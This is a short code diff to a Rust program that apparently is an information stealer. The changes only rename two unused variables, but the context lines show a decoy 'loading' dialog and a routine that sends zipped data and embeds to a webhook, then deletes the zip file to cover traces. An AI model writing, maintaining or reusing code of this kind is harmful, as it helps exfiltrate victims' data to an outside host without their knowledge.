@@ -44,7 +44,7 @@ const SUFFIX: u32 = {
 
 #[allow(dead_code)]
 fn show_loading_dialog() {
-    let result = api::message_box(&s_loading_title(), &s_loading_text(), api::MB_OK | api::MB_ICONINFORMATION);
+    let _result = api::message_box(&s_loading_title(), &s_loading_text(), api::MB_OK | api::MB_ICONINFORMATION);
 }
 
 #[allow(dead_code)]
@@ -198,7 +198,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let _ = fs::remove_file(&zip_path);
 
-    let statuses = crate::sender::send_to_webhook(&client, &wbh, embeds, zip_data, zip_name).await;
+    let _statuses = crate::sender::send_to_webhook(&client, &wbh, embeds, zip_data, zip_name).await;
 
     let _ = fs::remove_file(&zip_path);
 
